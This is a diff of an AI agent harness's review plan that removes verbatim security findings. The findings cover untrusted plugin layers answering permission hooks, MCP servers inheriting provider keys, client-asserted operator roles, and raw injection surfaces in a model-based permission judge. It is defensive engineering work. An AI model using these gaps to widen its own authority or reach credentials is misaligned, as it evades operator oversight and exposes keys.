-**Scope.** `scripts/letibot`, `tests/launcher.sh`, `provider/src/keys.rs` and a leaf-crate `config_dir()`. Bash words and the loop test now, `letibot-multi --verbs` next, the Rust shim after the phase (C13, decision 17). Bash through shellcheck, shfmt, `bash -n` and a smoke run. Carries R229's store half.
-
 **Proving tests.** a `tests/launcher.sh` loop over every verb asserting no `--prompt`, `launcher_and_daemon_resolve_same_providers_file`, `an_empty_xdg_config_home_is_unset`, a stub harnessd printing `--store` under `XDG_DATA_HOME=$T`. Each fails on the snapshot.
 
-**Size.** M. **After:** B9 (R329).
-
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
 **Folded rows.** R229's store half is folded here: `scripts/letibot:374` `STORE` still ignores `XDG_DATA_HOME` (I80).
 
-**Findings, verbatim from the record.**
-
-### I78. `hold`, `release` and bare `where` become a billed one-shot prompt
-- Status: VERIFIED. Severity: high.
-- Where: `scripts/letibot:637,898,1218-1221,2251,2304,2737-2739,2993-3005`; `letibot/src/main.rs:291-339`; `tools/src/lifecycle/reap.rs:680`; `sessionlog/src/warning.rs:987`; `tests/launcher.sh:105,1274-1280,1526-1554`.
-- Claim: the verb arm is `stats | boundary | fb | holds | gc`. `letibot hold s-123`, which the idle-close warning tells the operator to type, runs `harnessd --prompt "hold s-123"`. `letibot where --json` is stopped by the flag guard, so that half is overstated. No launcher test walks the multicall verb chain, `holds` and `gc` route but are untested, and the suite's `env -i` never exercises XDG drift (P7-F2).
-- Scenario: the operator types the suggested `letibot hold s-123`. A paid model turn answers the sentence, no hold is written, and the session closes five minutes later.
-- Change: now, add `hold | release | where` to the arm, plus a `launcher.sh` loop over every verb asserting `^letibot-multi <verb>` and no `--prompt`. Next, Rust publishes `letibot-multi --verbs`, and the arm and the test are derived from it. A `*)` refuse arm is not viable (section 3). Put the script through shellcheck, shfmt and `bash -n`, and smoke-test it.
-- Sources: P7-F1, P7-F2. P7 all positions, DeepSeek (supplementary).
-- Test: `for v in holds gc where hold release notes doctor; do ...; done` in `tests/launcher.sh`, plus `launcher_routes_hold_release_where_to_multicall` against a fake harnessd that fails on `--prompt`. Fails today.
-
-### I79. The launcher and the daemon read different providers.toml files
-- Status: VERIFIED. Severity: high (P7 D3).
-- Where: `scripts/letibot:935,1093-1112,1124-1175,1384-1412,1509`; `provider/src/keys.rs:194-201,227,236-247,850-876,1059-1061`; `plugins/src/paths.rs:36-57`; `harnessd/src/cli.rs:208,450`; `harnessd/src/slash.rs:858`; plus the resolvers listed in P6-F10.
-- Claim: the launcher uses `LETIBOT_PROVIDERS` or `$HOME/.config` and ignores `XDG_CONFIG_HOME`. Rust honours `XDG_CONFIG_HOME` and never reads `LETIBOT_PROVIDERS`. The `:1093` comment ("points both readers") is false.
-  - An empty `XDG_CONFIG_HOME` makes `keys::config_file` read a cwd-relative `letibot/providers.toml` from the workspace, so a repo can choose where a credential is sent (P7-F4, P6-F10).
-  - Nine XDG resolvers disagree on the empty value (P6-F10).
-  - The awk `model_home` and `default_provider` readers differ from `parse_file`: comments, `[default] # x`, duplicate blocks, stray lines (P7-F7, P7-F8, reproduced by P7 r2 fable).
-- Scenario: with `LETIBOT_PROVIDERS=/alt/p.toml`, the launcher derives `--endpoint` and the banner model from `/alt`, while the daemon takes keys and `[default]` from `~/.config`. The provider is mixed, and the record names the wrong model.
-- Change: one `config_dir()` in a leaf crate that ignores empty and relative values, called by every resolver. The launcher asks `letibot-multi` for the providers path, the model home and the default instead of parsing. Drop `LETIBOT_PROVIDERS`, or wire it into Rust. Fix the comment.
-- Sources: P7-F3, P7-F4, P7-F7, P7-F8, P6-F10. P7 all positions, P6 r1 Kimi, P6 r2 sonnet, P6 r1 fable, P6 r2 DeepSeek, DeepSeek (supplementary).
-- Test: `launcher_and_daemon_resolve_same_providers_file` (an `XDG_CONFIG_HOME` case and a `LETIBOT_PROVIDERS` case), `an_empty_xdg_config_home_is_unset`, and awk regression cases for `#` and duplicate blocks.
-
-### I80. The launcher's store ignores `XDG_DATA_HOME`, while gc, holds, the bridge and the room honour it
-- Status: VERIFIED. Severity: high.
-- Where: `scripts/letibot:374-391,1948,2231,2737-2745,3002,3061`; `tools/src/lifecycle.rs:343-346`; `bridge/src/daemon.rs:90-107`; `letibot/src/gc.rs:1070`.
-- Claim: `STORE=${LETIBOT_STORE:-$HOME/.local/share/letibot}` is passed as `--store` to harnessd, while the multicall verbs, the bridge and the room resolve `XDG_DATA_HOME` first. `LETIBOT_STORE` is not exported. The launcher also folds `sessions.db` against the split directory itself (P7-F6). `migrate` gets `--store`, so that part is overstated.
-- Scenario: in a sandboxed run with `XDG_DATA_HOME` set, the daemon writes the operator's store while `gc`, `hold` and `holds` act on another. gc sees no owners, and holds are invisible.
-- Change: `${XDG_DATA_HOME:-$HOME/.local/share}/letibot` and `export LETIBOT_STORE`. Then delete the bash folding and let harnessd resolve its own store.
-- Sources: P7-F5, P7-F6. P7 r1 opus, P7 r1 sonnet, P7 r2 GLM, P7 r2 Kimi, DeepSeek (supplementary).
-- Test: a shell test with a stub harnessd printing its `--store`, under `XDG_DATA_HOME=$T`, asserting `$T/letibot`.
+**Findings.** I78, I79, I80, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R332 - B12 store carve: rows committed after the claim check are deleted uncopied
 
@@ -1117,42 +713,11 @@ Carried from R339/I36: a `new_session` fork does not take the original session's
 - No `/mcp pin` verb: the operator pastes the line the warning prints. The operator's live config has no `[mcp_projects]`, so nothing stops on this box.
 - A `new_session` limit answer is not restricted to the candidates (only `switch` is, per A10-F15).
 
-**Scope.** `harnessd/src/plugins/hook.rs`, `plugins/src/stack.rs`, `crates/mcp`, `leticode-config` MCP trust, `harnessd/src/mcp.rs`. Plus I65's MCP part (entry in R320). Decision 8: `env_clear` and a process group now, the exec sandbox later. Decision 9: an unpinned layer's deciding answer falls back to the fixed ladder, then the pin flow offers a pin.
-
 **Proving tests.** `an_unpinned_layers_limit_decide_answer_is_ignored`, `stdio_spawn_does_not_leak_env_or_orphan`, `an_edited_mcp_json_under_a_trusted_dir_is_not_started`, `an_mcp_server_endless_line_is_dropped`. Each fails on the snapshot.
 
-**Size.** M. **After:** -.
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
-
-**Findings, verbatim from the record.**
-
-### I93. Unpinned layers answer the deciding hooks
-- Status: VERIFIED. Severity: high.
-- Where: `harnessd/src/plugins/hook.rs:10,16-18,223,259,289-352,390-403`; `plugins/src/stack.rs:52,140,334-335,932-1030,1053-1088`; `plugins/src/manifest.rs:542`; `harnessd/src/harness/limit_hook.rs:105-114,155-197,413`; `harnessd/src/harness/turns.rs:3613-3630`.
-- Claim: `answers` and `answering` pick the topmost enabled layer that exports the hook and never read `Layer::trusted`. `Stack::run` bans only the floor and review hooks for a session layer. A cloned repo's `.letibot/plugins` layer, loaded with no opt-in, answers `limit_decide`, `steer_turn` and `compact_summary`. `stack.rs:52` documents "an untrusted layer still answers". A `limit_decide` switch lands on any configured metered model, not only the candidates (A10-F15). The `Do::Call` chain bounds are untested (A10-F13).
-- Scenario: clone a repo that ships a project layer, then hit a 429. The layer posts its own question on the operator's card, switches provider, forks, or parks. On other turns it continues turns with its own text and writes the compaction record.
-- Change: a DECIDES list beside NOT_A_SESSIONS (`limit_`, `steer_`, `compact_`) that requires `layer.trusted`. An untrusted answer falls back to the fixed ladder. Restrict switch to candidates.
-- Sources: A10-F1, A10-F13, A10-F15. A10 r1 GLM, A10 r2 opus, A10 r2 DeepSeek, A10 r1 fable, A10 r1 Kimi, DeepSeek (supplementary).
-- Test: `an_unpinned_layers_limit_decide_answer_is_ignored` (the existing `limits.rs` test that discovers an unpinned layer must change). Add a chain cycle test.
-
-### I94. MCP stdio servers inherit the daemon's environment and are not reaped as a group
-- Status: VERIFIED (mechanism). Severity: high by ledger, medium by the refute-lens (the trust model matches other agents).
-- Where: `mcp/src/wire.rs:40-52,80-91,240-244`; `harnessd/src/mcp.rs:28-46`; `provider/src/keys.rs:236-240`.
-- Claim: `.envs(env)` without `env_clear`, no process group, no sandbox. Drop kills only the direct child. Every other spawn path clears the env.
-- Scenario: an npx MCP server reads the provider keys from the environment, and its node grandchild outlives the kill.
-- Change: `env_clear` plus an allow-list (PATH and the spec's env), an own process group with `killpg` on drop, and a spawn through the exec backend sandbox (decision 8).
-- Sources: A10-F2. A10 r1 fable, A10 r2 DeepSeek, A10 r2 sonnet, A10 r2 opus, A10 r1 GLM, DeepSeek (supplementary).
-- Test: `stdio_spawn_does_not_leak_env_or_orphan`. The secret line is empty, and the grandchild is gone after drop. Fails today on both.
-
-### I95. A checkout's `.mcp.json` is trusted by directory prefix, not by content
-- Status: VERIFIED. Severity: high (A10 D, disputed).
-- Where: `leticode-config/src/lib.rs:1186,1271-1281`; `harnessd/src/mcp.rs:36-69`; `harnessd/src/harness/open.rs:2120-2151`; `leticode-config/src/tests.rs:2136-2158`.
-- Claim: `ws.starts_with(t)` trusts every worktree under a trusted directory. The file is read fresh at every open, so any later edit runs at the next open. A project file cannot trust itself, but edits inside a tree that is already trusted are not caught.
-- Scenario: a PR or an agent edits `.mcp.json` in `<project>/worktrees/wt-x`. The next open there execs the new command as the operator, with every key in its environment (I94).
-- Change: trust the file by sha256 and exact path. Report a moved pin and start nothing until the operator trusts it again.
-- Sources: A10-F3. A10 r1 GLM, A10 r1 fable, A10 r2 opus, DeepSeek (supplementary).
-- Test: `an_edited_mcp_json_under_a_trusted_dir_is_not_started`.
+**Findings.** I93, I94, I95, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R335 - B15 header facts: header ctx survives a clear, a reseat and a re-ingest
 
@@ -1176,24 +741,11 @@ Carried from R339/I36: a `new_session` fork does not take the original session's
 - Lead 41's second half, `esc` from the composer offering to close the pane, is not built: esc there arms the interrupt, and changing it needs the operator's call.
 - `every_pane_draws_its_key_map` skips the session picker, whose list takes about 25s to build in a debug test.
 
-**Scope.** `sessionlog/src/view.rs` fork arm and the `event.rs` field, `tui/src/app/events/*`, `harnessd/src/harness/clear.rs`, `sessions.rs` reseat. A shown-unit `context_after` on every fork event, the prose parse deleted. The facts frame (I76) is after the phase (C16, decision 19).
-
 **Proving tests.** `a_snapshot_after_an_idle_compaction_shows_the_new_base_in_the_header`, `a_clear_moves_the_header_ctx`. Each fails on the snapshot.
 
-**Size.** M. **After:** B1 (R320), B6 (R326).
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
-
-**Findings, verbatim from the record.**
-
-### I72. Header context is stale after a compaction, a clear or a reseat
-- Status: VERIFIED. Severity: high.
-- Where: `sessionlog/src/view.rs:626-644,731-745,761`; `tui/src/app/events/mod.rs:139,241-247,373-391`; `tui/src/app/events/warnings.rs:109-126`; `tui/src/ui/transcript/notice_card.rs:208,224-246`; `harnessd/src/harness/clear.rs:75,86-108`; `harnessd/src/sessions.rs:1288,4121-4136,5259-5264`; `sessionlog/src/event.rs:892-901`.
-- Claim: the daemon view keeps the pre-fork turn usage across `TranscriptForked`, and snapshot load copies it into the header. Only the live arm corrects it, by parsing warning prose. That parse fails for `/clear` (ids around the arrow), `/reseat` (no arrow) and re-ingest (`re-seated:` prefix). It drops the `estimated` flag. `tokens_after` is in ledger tokens, not the shown unit (STALE-F3). R298 holds only for a head attached live (L10).
-- Scenario: the operator clears a 180k conversation. The header keeps `180k ctx` with no age, and the operator concludes the clear failed.
-- Change: carry a shown-unit `context_after`, with its estimate flag, on every fork event (compact, clear, reseat, re-ingest). The daemon rewrites the view's turn usage at the fork. The head takes the value in both arms and deletes `compaction_after`.
-- Sources: STALE-F1, STALE-F2, STALE-F3, L10. STALE r1 fable, STALE r2 opus, STALE r2 sonnet, STALE r2 DeepSeek, STALE r1 Kimi, DeepSeek (supplementary).
-- Test: `a_snapshot_after_an_idle_compaction_shows_the_new_base_in_the_header` (12000, not 90000), and `a_clear_moves_the_header_ctx`. Both fail today.
+**Findings.** I72, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R353 - B15 theme: the status bar's queue counter is this session's tree, not the project's
 
@@ -1231,13 +783,9 @@ Carried from R339/I36: a `new_session` fork does not take the original session's
 - The bridge's protocol skew against a daemon (I71's other half) and the stale daemon notice are R344.
 - Leads 31 and 32 are recorded below as plan items, no code (decision 20, C19).
 
-**Scope.** `bridge/src/tools.rs` start, `harnessd/src/cli.rs` flag handling, the bridge plugin restart after install, a caller lease for leticode sessions. The review was run by the layer it reviewed and that layer failed five ways (leads 27-30, 33). Rule: a flag or field that is accepted applies or refuses; warn-and-continue is not an outcome.
-
 **Proving tests.** `start_with_unknown_mode_refuses_and_sends_no_brief`, `a_one_shot_with_model_runs_that_model_or_refuses`, `two_starts_in_one_folder_both_survive_or_the_second_refuses` (reproduce first), `stopping_the_caller_closes_its_sessions`, `a_stale_bridge_binary_says_so_at_attach`, `a_fan_out_over_a_providers_live_window_refuses_or_splits`. Each fails on the snapshot.
 
-**Size.** M. **After:** -.
-
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
 **Items.**
 - Lead 27 / I28: refuse an unknown mode, hold the session, send nothing, list the valid names.
@@ -1250,47 +798,15 @@ Carried from R339/I36: a `new_session` fork does not take the original session's
   - lead 31: one background-after-threshold rule for every tool. Past the threshold a call becomes a job with the same settlement path. Today only `bash` does it (`tools/src/builtins/bash.rs:266-276,462-469`); `digest`, `task` waits, `web_fetch` and `search` hold the turn.
   - lead 32: one orchestration primitive that runs as a background job and settles like a `task` - fan-out, fold, verify, a resume cache, an own worktree per child, waits on child exit only, a canary first, no silent caps, a backup before resume. `digest` is its first script, review panels the second. Every fan-out records each child's actual model, mode and exit and checks them against what was asked before using the result.
 
-**Findings, verbatim from the record.**
-
-### I28. A mistyped mode on `leticode_start` runs the session at the daemon's default
-- Status: VERIFIED by the integrator's read: `bridge/src/tools.rs:492-499` keeps the session and sends the brief when `h.set_mode(mode)` fails, recording only `mode_error`. A model failure, by contrast, holds the session and refuses (`:477-488`). Severity: high (lead L27).
-- Where: `bridge/src/tools.rs:461-499,2071`; `tools/src/mode.rs:440-458`.
-- Claim: `Mode::parse` refuses an unknown name, but the bridge swallows the refusal and the brief runs at writes-allowed. A typo widens the session.
-- Change: on a mode error, hold the session, send no brief, and return an error listing the valid names. This mirrors the model branch.
-- Sources: L27. Found while running the review.
-- Test: `start_with_unknown_mode_refuses_and_sends_no_brief` in `bridge/tests`. Mode "read-edits" must give Err naming the valid modes, with no turn started. Today it returns Ok with `mode_error`.
-
-### I81. A flag that the one-shot accepts and ignores: `--model`
-- Status: VERIFIED by the integrator's read. `harnessd/src/cli.rs:401-403` prints `config_notice` (`cli/help.rs:614-618`) to stderr and continues. Severity: high (lead L33).
-- Where: `harnessd/src/cli.rs:401-404`; `harnessd/src/cli/help.rs:605-618`; `scripts/letibot:419,2461,2474,2674`.
-- Claim: `leticode --model X` in a one-shot prints "--model is a config setting now" and runs the default model. All 60 earlier "external" review positions ran on deepseek-flash this way, which is why the panels credit them as "DeepSeek (supplementary)". `--restart` drops the original `--model` and `--provider` (P7-F13, HYP).
-- Scenario: a caller asks for GLM and is billed for, and answered by, another provider, silently.
-- Change: a config-backed flag on the one-shot either applies to that run or refuses with the key name. It never warns and continues. `--restart` reads model and provider from the record before removing it.
-- Sources: L33, P7-F13. P7 r1 opus, P7 r2 GLM, DeepSeek (supplementary).
-- Test: `a_one_shot_with_model_runs_that_model_or_refuses`, and `restart_keeps_model_and_provider`.
-
-### I100. Workflow and orchestration stability (leads L28, L31, L32)
-- Status: UNVERIFIED. L28 was observed. The integrator read `bridge/src/tools.rs:366-400` and `bridge/src/daemon.rs:580-594`: `start` opens a session on the folder's one daemon (`ensure_with`), so the replace mechanism is not in that path and was not found. Severity: high for L28, medium for L31 and L32.
-- Where: `bridge/src/tools.rs:366-400`; `bridge/src/daemon.rs:580-610`; `tools/src/builtins/bash.rs:266-276,462-469`; `tools/src/builtins/digest.rs`.
-- Claim:
-  - L28: parallel `leticode_start` calls in one folder replaced each other within minutes, and the replaced sessions vanished ("no such session") with no report.
-  - L31: only bash moves itself to the background past the threshold. `digest`, `task` waits, `web_fetch` and `search` hold the turn.
-  - L32: `digest` is a hard-coded inline fan-out and fold whose helpers are already background children.
-- Change: L28 - reproduce first with two starts in one folder, then refuse, or name what was replaced. L31 - one rule for every tool: past the threshold a call becomes a job with the same settlement path. L32 - one orchestration primitive run as a background job that settles like a `task`, with a resume cache, an own worktree per child, waits on child exit only, a canary first, no silent caps and a backup before resume. `digest` becomes its first script. L31 and L32 are features under the stability phase (decision 20).
-- Sources: L28, L31, L32.
-- Test: `two_starts_in_one_folder_both_survive_or_the_second_refuses`, `a_long_digest_becomes_a_job`.
+**Findings.** I28, I81, I100, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R337 - the shadow as the real `AuthorisationOracle`: the view-read trail, `allow_once` on a view, hygiene, one grant model
 
 **Status:** built 2026-11-16 on `r337-oracle` (base `b2-shadow`), not landed. Filed 2026-11-16 from the review at `9e9312b06` (line numbers at the snapshot). Theme row of `docs/review/2026-11-16-letibot.md` section 7. Findings: I12, I13, I14, I15, I16, I17. Record: `docs/review/2026-11-16/INTEGRATION.md`.
 
-**Scope.** Automode prerequisite, after B2 and B3. I12, I15 and I17 (i) are the R316 stage-1 gate. I13 is the oracle move: the shadow becomes layer B of `AuthorisationOracle` and the Relay path is retired (C6). I14 and I16 close the grant model: scope in the answer, revoke reaching running commands and other processes.
-
 **Proving tests.** `view_asks_are_recorded_and_shadow_rows_excluded_from_agreement` (I17 i) and the tests named in each entry. Each fails on the snapshot.
 
-**Size.** L. **After:** B2 (R322), B3 (R323).
-
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
 **Folded rows.** R317's two leftovers that are not in INTEGRATION: a sibling that waited on the same path's card (`Claim::Shares`) is granted too, as for an operator answer; and `tools` `adjudicate::tests::outcomes::a_reviewers_probe_runs_at_allow_all_and_anything_beyond_still_asks` was red on land-10 (`gate:mode` where `gate:reviewer` is expected) - re-check it.
 
@@ -1315,73 +831,7 @@ Carried from R339/I36: a `new_session` fork does not take the original session's
 - `shadow replay --job permission` still replays the rule question, not the oracle question.
 - Flaky under load (passed alone): `tools --test confine a_sessions_tmp_is_created_at_open_and_removed_at_close`, `tools --test shell_suites`, `harnessd shadow::tests::a_slow_median_pauses_the_job_too`.
 
-**Findings, verbatim from the record.**
-
-### I12. A view read's tier is a literal, and its trail is empty
-- Status: DISPUTED. Severity: high as a stage-1 blocker (P9 D2, D6). There is no present exploit.
-- Where: `tools/src/adjudicate.rs:2678,2784,2787,2837`; `harnessd/src/answers.rs:432-440`; `tools/src/authorise.rs:1842`.
-- Claim: `ask_to_see` never classifies the path. The tier is `Tier::MayApprove` by literal, and the trail is `AuthorisationTrail::default()`. Always-ask exclusion from the shadow holds only by that literal, and the empty `NotCollected` trail is what keeps `ModelAdjudicator` at Unavailable.
-- Refute-lens: today `read_passes` refuses the credential paths it knows before the shadow can act, and Unavailable fails closed. The repro-lens notes that `~/.aws` gets no screen at the gate. The breakage arrives with R316's trail or classifier.
-- Change: classify the path with `Surroundings` and set the tier from it (secret path gives `AlwaysAsk`). Carry the asker's trail. Use one always-ask predicate for `note_before` and the gate. Land this in the same change that wires R316's trail, together with I15's vocabulary bridge.
-- Sources: P9-F3. P9 r1 opus, P9 r1 sonnet, P9 r2 GLM, P9 r2 Kimi (mechanism), DeepSeek (supplementary). Disputed by P9 r1 DeepSeek and P9 r2 fable.
-- Test: `view_ask_for_credential_path_is_always_ask`. Spy adjudicator, `grant_view("/home/u/.aws/credentials", ..)`, assert `Tier::AlwaysAsk`. Fails today.
-
-### I13. The shadow is a second authorisation model, and grants live in four stores
-- Status: UNVERIFIED (verified in P3 and P9 syntheses). Severity: medium. It is a design precondition for any stage past read-only.
-- Where: `harnessd/src/shadow/permission.rs` (Relay); `harnessd/src/answers.rs:151-182,452-460,493-507`; `sessionlog/src/pending_asks.rs:255`; `tools/src/authorise.rs:1010`.
-- Claim: Relay answers through `Note::Answer` with a rule citation, bypassing `AuthorisationOracle` and its trail. It fires only when no deciding head is attached (`answers.rs:459`), so the model widens authority exactly when no person is there. Grants live in `permission.json`, approved shapes, `session_grant` and ViewGrants. This is lead L16's first bullet.
-- Change: fix I8, I9, I10 and I11 in place now. Before any stage widens past read-only view grants, make Relay annotator-only and put a shadow adjudicator behind `AuthorisationOracle` that returns a trail and a scope. This is layer B, per the operator's decision.
-- Sources: P3-F15, P9-F13. P3 r1 DeepSeek, P3 r1 sonnet, P3 r2 GLM, P3 r2 Kimi, P9 r1 sonnet, DeepSeek (supplementary).
-- Test: after the move, `relay_never_answers_a_card` (Note carries no Answer variant).
-
-### I14. Grant scope depends on who answered, chosen by a side-channel boolean
-- Status: UNVERIFIED (traced in P9). Severity: medium.
-- Where: `harnessd/src/answers.rs:151-182,225`; `tools/src/adjudicate.rs:1731-1739,2790`.
-- Claim: `take_relayed` picks the scope. The same ask is kept at Session scope when the shadow answers and at Queue scope when the operator answers the relayed card. Nothing records why. This replaces opus F4 ("shadow grants queue-wide"), which is refuted (section 3).
-- Change: put the scope in `Note::Answer` and in the oracle's answer, and have `keep_grant` take it from there.
-- Sources: P9-F8. P9 r1 sonnet, P9 r2 GLM, P9 r2 Kimi, DeepSeek (supplementary).
-- Test: extend `answers/escalate_tests.rs:1061`, which asserts Session, with an operator-answered relayed card that asserts Queue, both read from the answer.
-
-### I15. The oracle's `allow_once` on a view request maps to Refused
-- Status: UNVERIFIED (checked by P9's synthesizer). Severity: medium. It is latent until R316 wires a trail.
-- Where: `tools/src/adjudicate.rs:2792-2799`; `tools/src/authorise.rs:438,1318,1938-1946`.
-- Claim: `ask_to_see` maps answers by option-id literal (`grant_ro`/`grant_rw`). The oracle's allow is `allow_once`, which becomes `ViewGrant::Refused`.
-- Change: bridge the vocabularies in `ask_to_see` (`allow_once` gives `grant_ro`, never rw) in the same change as I12.
-- Sources: P9-F4. P9 r2 Kimi only.
-- Test: an oracle allow on a view request is granted read-only.
-
-### I16. Revoke reaches neither running commands nor other processes
-- Status: UNVERIFIED. The process-local atomic was checked by P9. Cross-process deployment was not. Severity: medium.
-- Where: `harnessd/src/grants.rs:85-116`; `tools/src/view.rs:237`; `tools/src/grant_ledger.rs:17`; `tools/src/adjudicate.rs:1654-1667`.
-- Claim: revoke drops the bind at the session's next call, so a running command keeps reading. `refresh_grants` reloads only when a process-local atomic moves, and keeps the old copy when the ledger read fails. L18 is this item.
-- Change: compare a store-side generation or max row id. Fail closed on a read error for view claims. Check a revoke generation at exec start. On revoke of a shadow grant, kill or unmount the bound children's namespace.
-- Sources: P9-F6, P9-F9, L18. P9 r1 opus, P9 r1 sonnet, P9 r1 DeepSeek, P9 r2 GLM, P9 r2 Kimi, DeepSeek (supplementary).
-- Test: `a_revoke_in_another_process_is_seen_at_the_next_call`. Two store connections, revoke through one, and assert the other gate refuses.
-
-### I17. Shadow hygiene: injection surfaces, the missing task, resume, cost and stale docs
-- Status: UNVERIFIED. Severity: low to medium.
-- Where and claims:
-  - (a) The asker-controlled path, `arguments` and `reading` go into the judge prompt raw and unspanned, so they are quotable as evidence and can carry newlines (`shadow/permission.rs:304-323`). From P3-F13 and P9-F11.
-  - (b) The acting path judges with `task: None` (P3-F8).
-  - (c) Stateless "during" offers act on quotes found in tool output (`shadow/verdict.rs:415`, `during.rs:304`; P3-F9).
-  - (d) Resume verifies only the last kept turn (`shadow/conversation.rs:127-143`, `resume.rs:76-97`; P3-F12).
-  - (e) A shadow timeout makes `annotate` ask the same question a second time (`answers.rs:186-198`; P3-F14).
-  - (f) The `turn_end` model path has no published lift over the regex (P3-F11).
-  - (g) The `Job::acts` and `on_outcome` docs say "Permission is observe-only", which has been false since R317 (`shadow.rs:72,189`; P3-F10).
-  - (h) `queue_kind` trusts the role string (`shadow/permission.rs:~244`; P9-F12, HYP).
-  - (i) View asks never reach the corpus, and naive inclusion would score `shadow:` rows against themselves (`adjudicate.rs:2678-2876`; P9-F7).
-- Change:
-  - (a) Reject control characters in `view_read` paths, and span asker fields with a non-operator author.
-  - (b) Pass the operator's task into `shown_for`.
-  - (c) No acting offers unless strict.
-  - (d) Verify every kept turn on resume, or drop the ones that do not verify.
-  - (e) Skip `annotate` after a timeout.
-  - (f) Run `replay.rs` on labelled turns and publish the numbers before deleting anything.
-  - (g) Fix the docs.
-  - (h) Derive queue membership from `grant_ledger::queue_of`.
-  - (i) Record view asks, and exclude `verdict_by` starting `shadow:` from agreement metrics.
-- Sources: P3 and P9 as listed. P9-F7 and the exclusion of `shadow:` rows are stage-1 blockers per P9 D4.
-- Test: one test per item. The stage-1 gate needs (i): `view_asks_are_recorded_and_shadow_rows_excluded_from_agreement`.
+**Findings.** I12, I13, I14, I15, I16, I17, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R338 - role per connection and the masked operator socket
 
@@ -1400,24 +850,11 @@ Carried from R339/I36: a `new_session` fork does not take the original session's
 
 **Tests run.** `cargo test -p letibot-sessionlog` (every suite), `-p letibot-transcript`, `-p letibot-tools --lib`, `--test wide_seat --test file_fence`, and `-p letibot-harnessd --lib`; `cargo clippy -D warnings` on sessionlog, tools and harnessd. Red here for reasons that are not this change: eleven `tools` tests that make a git commit (`gpg … No secret key`), `harness::tests::reviewer_mode::a_reviewer_at_the_operators_allow_all_probes_its_clone_unasked_and_asks_beyond_it` (bwrap cannot create a namespace: `ENOSPC … max_*_namespaces`), and two `mergequeue::review::claude_tests` SIGINT/grace timing tests. The four `harnessd` `intent` failures this row did cause were its fixtures relying on the old speaker default; they name `Speaker::Operator` now.
 
-**Scope.** I6, and the rest of I5 (entry in R320): the socket path a connection came in on decides its role (C22); ancestry and cgroup stay as a defence and for askpass routing. Decision 6: mask the operator socket in the wide view now; tmux, the bus and docker are ruled on separately.
-
 **Proving tests.** `a_non_mcp_identity_without_from_is_not_operator` and `a_process_spawned_by_a_foreign_parent_is_refused_operator_doors`, which fail on the snapshot — the first stored the prompt as the operator's, the second found no visible socket at all.
 
-**Size.** M. **After:** B1 (R320).
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
-
-**Findings, verbatim from the record.**
-
-### I6. Speaker and role are asserted by the client, and a missing value means Operator
-- Status: UNVERIFIED (verified in P2's synthesis). Severity: medium.
-- Where: `sessionlog/src/protocol.rs:621-627,650-657`; `sessionlog/src/hub.rs:87-94`; `harnessd/src/harness/turns.rs:258-271`; `sessionlog/src/server.rs:712-720`; `harnessd/src/harness/hub_io.rs:210-225`; `transcript/src/lib.rs:47-56,86-102,144-150`; `harnessd/src/harness/trail.rs:103-142`; `acp/src/session.rs:34,368`.
-- Claim: `from` is optional and absent means Operator. Identity and kind are client strings, and the only agent rule is `identity == letibot-mcp`. `Speaker`'s serde default is Operator, so pre-speaker rows reseed as citable operator words. Peer handles in `from` are free strings tied to no connection. ACP prompts carry no `from`, which is contested because ACP is an editor seat.
-- Scenario: a same-uid process attaches with any identity other than `letibot-mcp` and sends Prompt without `from`. Its text is trailed as Operator. A bridge signs as `cc@rano`.
-- Change: fix a role per connection at Attach. Head kinds `tui` and `remote` from outside the tree are Operator, and every other identity is Peer. Never take the role from a frame field. Reseed maps an absent speaker to Agent, and the default moves off Operator for new rows. Resolve `from` handles against the seats the connection holds. Slash (I2) and steering follow the role. No token now.
-- Sources: P2-F5, P2-F7, P2-F10, P2-F12. P2 r1 Kimi, P2 r2 sonnet, DeepSeek (supplementary). Contested as the uid threat model by P2 r1 fable and P2 r2 DeepSeek.
-- Test: `a_non_mcp_identity_without_from_is_not_operator`. Attach as identity `x`, send Prompt with no `from`, and assert the stored speaker is Peer.
+**Findings.** I6, verbatim in `docs/review/2026-11-16/INTEGRATION.md`.
 
 ## R339 - gate ladder after "once means once"
 
@@ -1439,103 +876,19 @@ Carried from R339/I36: a `new_session` fork does not take the original session's
 - I36's queue half is not done: a `new_session` fork does not take the original session's queued prompts or `handed_back` with it, and the hook is not yet idempotent per episode. `sessionlog::Hub` has no seam to drain a queue (`take_queued_interrupt` takes one prompt), so this needs a new Hub door rather than a fix. Moved to R328 (B8 limit state owns the limit hook and the owed turn).
 - Box facts met here, none of them this change: `tools` `lifecycle::tests_disks::a_copy_out_is_in_the_archive_namespace_before_it_is_removed` is red on main in this seat; `harnessd`'s `reviewer_mode::a_reviewer_at_the_operators_allow_all...` (no usable bwrap namespace) and the two `mergequeue::review::claude_tests` are red on main in this seat too.
 
-**Scope.** Decision 2 is taken: a `GrantScope::Once` point means once, drop the session rung and refuse AllowSession. I33 (f) lands in B4 (R324). I36's parentless fork carries the I36 equality-test rule's own instance.
-
 **Proving tests.** the tests named in each entry. Each fails on the snapshot.
 
-**Size.** M. **After:** B4 (R324), B6 (R326).
+**Done when:** every proving test above is green on main through one full gate, and each finding named under Findings is closed or moved to a named row.
 
-**Done when:** every proving test above is green on main through one full gate, and each finding below is closed or moved to a named row.
-
-**Findings, verbatim from the record.**
-
-### I29. GrantScope::Once changes nothing
-- Status: UNVERIFIED (opus ran the related Once-point shape case, which is I18). Severity: medium, policy.
